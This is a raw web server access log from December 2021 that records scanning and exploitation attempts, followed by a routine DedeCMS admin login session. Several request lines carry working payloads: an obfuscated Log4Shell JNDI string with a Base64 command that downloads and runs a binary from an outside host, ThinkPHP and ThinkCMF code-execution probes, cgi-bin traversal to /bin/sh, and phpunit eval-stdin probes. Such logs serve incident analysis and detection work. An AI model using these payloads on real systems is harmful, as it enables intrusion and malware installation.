18.221.182.245 - - [25/Dec/2021:00:47:19 +0800] "GET / HTTP/1.1" 200 14759 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTguMjIyLjEyMi4yMjEvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8xOC4yMjIuMTIyLjIyMS9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//135.148.130.60:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTguMjIyLjEyMi4yMjEvcmVhZGVyOyBjdXJsIC1PIGh0dHA6Ly8xOC4yMjIuMTIyLjIyMS9yZWFkZXI7IGNobW9kIDc3NyByZWFkZXI7IC4vcmVhZGVyIHJ1bm5lcg==}')"
118.126.124.172 - - [25/Dec/2021:02:35:42 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
177.131.121.245 - - [25/Dec/2021:02:51:30 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.54.160.149 - - [25/Dec/2021:03:51:57 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:03:20 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:04:51 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:06:21 +0800] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:06:22 +0800] "GET /xmlrpc.php?rsd HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:06:23 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:53 +0800] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:54 +0800] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:55 +0800] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:55 +0800] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:56 +0800] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:57 +0800] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:58 +0800] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:58 +0800] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:07:59 +0800] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:08:00 +0800] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
198.98.49.124 - - [25/Dec/2021:04:06:30 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
103.156.91.51 - - [25/Dec/2021:04:08:01 +0800] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
103.156.91.51 - - [25/Dec/2021:04:08:01 +0800] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36"
192.248.163.205 - - [25/Dec/2021:04:41:14 +0800] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 260 "-" "ZmEu"
192.248.163.205 - - [25/Dec/2021:04:41:14 +0800] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 260 "-" "ZmEu"
42.157.129.131 - - [25/Dec/2021:05:03:59 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
195.54.160.149 - - [25/Dec/2021:05:07:18 +0800] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.198.74.4 - - [25/Dec/2021:05:35:06 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
195.54.160.149 - - [25/Dec/2021:06:04:28 +0800] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
177.67.8.15 - - [25/Dec/2021:06:07:39 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
187.147.127.63 - - [25/Dec/2021:06:50:46 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.54.160.149 - - [25/Dec/2021:06:52:42 +0800] "GET /console/ HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
111.7.100.16 - - [25/Dec/2021:07:06:48 +0800] "GET / HTTP/1.1" 200 4923 "-" "Chrome/54.0 (Windows NT 10.0)"
35.195.93.98 - - [25/Dec/2021:07:22:26 +0800] "GET / HTTP/1.1" 200 4923 "-" "python-requests/2.26.0"
195.54.160.149 - - [25/Dec/2021:07:55:24 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
36.137.95.6 - - [25/Dec/2021:08:02:45 +0800] "POST /seeyon/thirdpartyController.do HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
36.137.95.6 - - [25/Dec/2021:08:02:46 +0800] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
36.137.95.6 - - [25/Dec/2021:08:02:46 +0800] "GET /seeyon/htmlofficeservlet HTTP/1.1" 404 260 "-" "python-requests/2.22.0"
193.118.53.202 - - [25/Dec/2021:08:51:26 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
118.97.201.186 - - [25/Dec/2021:08:58:18 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.54.160.149 - - [25/Dec/2021:09:13:57 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.54.160.149 - - [25/Dec/2021:09:30:22 +0800] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.195.174 - - [25/Dec/2021:09:44:33 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 zgrab/0.x"
118.126.124.141 - - [25/Dec/2021:09:47:08 +0800] "GET /$%7Bjndi:ldap://121.140.99.236:1389/Exploit%7D HTTP/1.1" 404 260 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.141 - - [25/Dec/2021:09:55:16 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.141 - - [25/Dec/2021:09:55:46 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
118.126.124.141 - - [25/Dec/2021:09:56:16 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
74.82.47.4 - - [25/Dec/2021:09:56:45 +0800] "GET / HTTP/1.1" 200 14759 "-" "-"
183.136.225.14 - - [25/Dec/2021:10:23:38 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
205.185.124.100 - - [25/Dec/2021:10:54:16 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 260 "http://101.33.239.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
118.126.124.74 - - [25/Dec/2021:12:28:36 +0800] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 290 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
45.79.204.46 - - [25/Dec/2021:12:47:36 +0800] "GET / HTTP/1.1" 200 4923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
93.187.107.175 - - [25/Dec/2021:13:47:11 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
118.126.124.141 - - [25/Dec/2021:15:11:55 +0800] "GET /xmlrpc.php?rsd HTTP/1.1" 404 36 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
103.139.66.174 - - [25/Dec/2021:15:18:57 +0800] "GET / HTTP/1.1" 200 14759 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
198.98.49.124 - - [25/Dec/2021:16:06:46 +0800] "GET / HTTP/1.1" 200 4923 "-" "Linux Gnu (cow)"
157.122.68.188 - - [25/Dec/2021:16:23:08 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 166 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0"
157.122.68.188 - - [25/Dec/2021:16:23:15 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 409 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27"
157.122.68.188 - - [25/Dec/2021:16:23:24 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 100 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
157.122.68.188 - - [25/Dec/2021:16:23:28 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"
157.122.68.188 - - [25/Dec/2021:16:23:34 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 221 "-" "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0"
157.122.68.188 - - [25/Dec/2021:16:23:38 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 249 "-" "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"
157.122.68.188 - - [25/Dec/2021:16:23:41 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
157.122.68.188 - - [25/Dec/2021:16:23:52 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 241 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36"
157.122.68.188 - - [25/Dec/2021:16:24:17 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 179 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
157.122.68.188 - - [25/Dec/2021:16:26:28 +0800] "POST /plus/ad_js.php?aid=3 HTTP/1.1" 200 162 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0"
43.129.249.215 - - [25/Dec/2021:16:28:43 +0800] "GET /dede/ HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:43 +0800] "GET /dede/login.php?gotopage=%2Fdede%2F HTTP/1.1" 200 1371 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /include/js/jquery/jquery.js HTTP/1.1" 200 24618 "http://101.33.239.168/dede/login.php?gotopage=%2Fdede%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/css/login.css HTTP/1.1" 200 780 "http://101.33.239.168/dede/login.php?gotopage=%2Fdede%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/css/base.css HTTP/1.1" 200 2271 "http://101.33.239.168/dede/login.php?gotopage=%2Fdede%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /include/vdimgck.php HTTP/1.1" 200 1313 "http://101.33.239.168/dede/login.php?gotopage=%2Fdede%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/images/safe-tips.gif HTTP/1.1" 200 365 "http://101.33.239.168/dede/css/login.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/login.php?dopost=showad HTTP/1.1" 200 426 "http://101.33.239.168/dede/login.php?gotopage=%2Fdede%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/images/login-top.jpg HTTP/1.1" 200 1996 "http://101.33.239.168/dede/css/login.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/images/login-bg.jpg HTTP/1.1" 200 5007 "http://101.33.239.168/dede/css/login.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/images/input.png HTTP/1.1" 200 903 "http://101.33.239.168/dede/css/base.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:44 +0800] "GET /dede/images/login-btn.jpg HTTP/1.1" 200 738 "http://101.33.239.168/dede/css/login.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:47 +0800] "GET /favicon.ico HTTP/1.1" 200 828 "http://101.33.239.168/dede/login.php?gotopage=%2Fdede%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:53 +0800] "POST /dede/login.php HTTP/1.1" 200 718 "http://101.33.239.168/dede/login.php?gotopage=%2Fdede%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:53 +0800] "GET /plus/img/wbg.gif HTTP/1.1" 200 259 "http://101.33.239.168/dede/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:54 +0800] "GET /dede/ HTTP/1.1" 200 3987 "http://101.33.239.168/dede/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/js/frame.js HTTP/1.1" 200 1807 "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/css/frame.css HTTP/1.1" 200 2127 "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/style1/style.css HTTP/1.1" 200 - "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/style1/admin_top_logo.gif HTTP/1.1" 200 3270 "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/blank.gif HTTP/1.1" 200 95 "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/leftmenu_bg.gif HTTP/1.1" 200 61 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/index_menu.php HTTP/1.1" 200 2447 "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/input.gif HTTP/1.1" 200 2618 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/search_bn.gif HTTP/1.1" 200 470 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/skinbutton.png HTTP/1.1" 200 945 "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /include/js/dedeajax2.js HTTP/1.1" 200 2346 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/allmenu.gif HTTP/1.1" 200 103 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/ico-sysmsg.png HTTP/1.1" 200 390 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/gtk-sadd.png HTTP/1.1" 200 246 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/gtk-del.png HTTP/1.1" 200 781 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/toggle_menu.gif HTTP/1.1" 200 136 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/quick_bg.gif HTTP/1.1" 200 1449 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/js/leftmenu.js HTTP/1.1" 200 1304 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/admin_top_bg.jpg HTTP/1.1" 200 397 "http://101.33.239.168/dede/css/frame.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/idnbgfoot.gif HTTP/1.1" 200 215 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/index_body.php HTTP/1.1" 200 3493 "http://101.33.239.168/dede/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/arr4.gif HTTP/1.1" 200 153 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/menunewbg.gif HTTP/1.1" 200 543 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
43.129.249.215 - - [25/Dec/2021:16:28:55 +0800] "GET /dede/images/leftbg2.gif HTTP/1.1" 200 535 "http://101.33.239.168/dede/index_menu.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
